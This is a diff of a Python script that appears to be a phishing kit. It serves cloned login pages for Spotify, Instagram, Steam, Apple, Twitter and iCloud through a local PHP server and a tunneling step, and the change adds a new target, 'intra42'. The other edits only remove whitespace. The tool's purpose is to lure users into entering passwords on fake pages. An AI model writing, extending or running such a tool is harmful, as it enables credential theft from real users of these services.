@@ -41,16 +41,16 @@ def prepare(pfm,loop_count):
 		print("System : "+colors.GREEN+"active \n"+colors.YELLOW+"Running : "+colors.GREEN+"localhost:8080 >>>  {}".format(pfm)+colors.BLACK)
 		php = "php -S localhost:8080 -t sites/{} > /dev/null 2>log&".format(pfm)
 		if(loop_count < 1):
-			pro = subprocess.Popen(php, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 		
+			pro = subprocess.Popen(php, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
 		else:
 			os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
-			pro = subprocess.Popen(php, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 		
+			pro = subprocess.Popen(php, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
 		loop_count += 1
 		tunneling()
 	except:
 		print(" ~ kill process")
 		try:
-			os.killpg(os.getpgid(pro.pid), signal.SIGTERM) 
+			os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
 		except:
 			pass
 
@@ -61,7 +61,8 @@ platforms = {
 3:"steam",
 4:"apple",
 5:"twitter",
-6:"icloud"
+6:"icloud",
+7:"intra42"
 
 }
 
@@ -74,14 +75,14 @@ print_platforms ="""
 {0} [1] {1} SPOTIFY          {0} [4] {1} APPLE
 {0} [2] {1} INSTAGRAM        {0} [5] {1} TWITTER
 {0} [3] {1} STEAM            {0} [6] {1} ICLOUD
+{0} [7] {1} INTRA42
 
 {3}""".format(colors.YELLOW,colors.WHITE,colors.BEIGE,colors.VIOLET)
 
 while(True):
-
 	if(loop_count > 0):
 		os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
-		
+
 	check = False
 	os.system("clear")
 	print(print_platforms)
